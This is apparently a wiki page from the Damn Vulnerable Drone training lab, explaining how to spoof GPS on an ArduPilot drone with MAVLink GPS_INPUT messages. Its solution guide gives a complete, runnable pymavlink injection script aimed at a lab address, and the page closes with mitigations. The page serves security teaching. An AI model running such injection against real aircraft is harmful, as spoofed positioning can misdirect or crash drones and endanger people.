<i>Injecting false GPS data into the flight controller using MAVLink GPS_INPUT messages to override real positioning sources.</i>

[Damn Vulnerable Drone](/nicholasaleks/Damn-Vulnerable-Drone) > [Attack Scenarios](/nicholasaleks/Damn-Vulnerable-Drone/wiki/Attack-Scenarios) > Injection > GPS Data Injection

# Description

GPS Data Injection involves spoofing GPS telemetry at the MAVLink layer using `GPS_INPUT` messages. Unlike traditional protocol tampering attacks that impersonate the GCS, this technique emulates a legitimate sensor — such as a second GPS unit — and injects trusted positional data directly into the drone’s state estimation system.

When ArduPilot is configured to allow MAVLink-based GPS (e.g., `GPS_TYPE2 = MAV`), the attacker can begin sending `GPS_INPUT` messages with a different `gps_id`. If their data appears higher quality (e.g., more satellites, lower HDOP), ArduPilot may blend or even switch to trusting the spoofed source — even mid-flight.

This type of injection is subtle, stealthy, and deeply trusted by the autopilot’s navigation stack.

# Resources

- <a href="https://mavlink.io/en/messages/common.html#GPS_INPUT">MAVLink GPS_INPUT</a>  
- <a href="https://ardupilot.org/copter/docs/common-optional-hardware-gps-blending.html">ArduPilot GPS Blending</a>  
- <a href="https://ardupilot.org/copter/docs/parameters.html#gps-type2-secondary-gps-type">ArduPilot Parameters: GPS_TYPE2</a>

---

<details>
<summary><strong>⚠️ Solution Guide</strong></summary>

<h3>Step 1. Install Required Tools</h3>
<pre><code class="code mb-3 mt-3">apt update
apt install python3 python3-pip -y
pip3 install pymavlink
</code></pre>

---

<h3>Step 2. Create the Spoof Script</h3>

Save the following Python code as <code>gps_injection.py</code>:

<pre><code class="code mb-3 mt-3">from pymavlink import mavutil
import time

def inject_fake_gps():
    mav = mavutil.mavlink_connection('tcp:10.13.0.3:5760')
    mav.wait_heartbeat()
    print("[+] Connected to drone")

    while True:
        mav.mav.gps_input_send(
            time_usec=int(time.time() * 1e6),
            gps_id=1,  # Secondary GPS
            ignore_flags=0,
            time_week=0,
            time_week_ms=0,
            fix_type=3,
            lat=473566100,
            lon=854619300,
            alt=500,
            hdop=50,
            vdop=50,
            vn=0,
            ve=0,
            vd=0,
            speed_accuracy=0,
            horiz_accuracy=0,
            vert_accuracy=0,
            satellites_visible=10,
            yaw=0
        )
        print("[!] Injected spoofed GPS_INPUT (gps_id=1)")
        time.sleep(1)

if __name__ == "__main__":
    inject_fake_gps()
</code></pre>

---

<h3>Step 3. Run the Attack</h3>

<pre><code class="code mb-3 mt-3">python3 gps_injection.py
</code></pre>

Your spoofed data will be accepted as a secondary GPS input (GPS2), potentially overriding the real GPS if blending or switching is enabled.

---

<h3>Step 4. Monitor the Impact</h3>

Watch the GCS or MAVProxy console for:

- Blended or switched GPS sources  
- Unexpected location drift  
- Altitude deviations  
- EKF inconsistencies or mode changes

---

<h3>Why This Is Different from Protocol Tampering</h3>

| Characteristic             | Protocol Tampering               | GPS Data Injection                      |
|---------------------------|----------------------------------|-----------------------------------------|
| Spoofed Identity          | Spoofed Drone Data Sent to GCS     | Physical onboard sensor (GPS2)          |
| Data Type                 | Commands, SYS_STATUS, STATUSTEXT | Raw telemetry data (GPS_INPUT)          |
| Layer Attacked            | Command/control logic            | EKF state estimation (sensor fusion)    |
| Trust Level               | Medium (GCS ID)                  | High (sensor input, may override GPS1)  |
| Operational Subtlety      | Operator-visible                 | Operator-invisible unless monitored     |

---

<h3>Mitigations</h3>

- Set `GPS_TYPE2` to `None` if a secondary GPS is not required  
- Monitor `EKF3_SRC1_YAW`, `GPS_BLENDED` status, and GPS switching logs  
- Enable MAVLink2 + signing to verify message authenticity  
- Isolate trusted telemetry sources via firewalling or port filtering

</details>
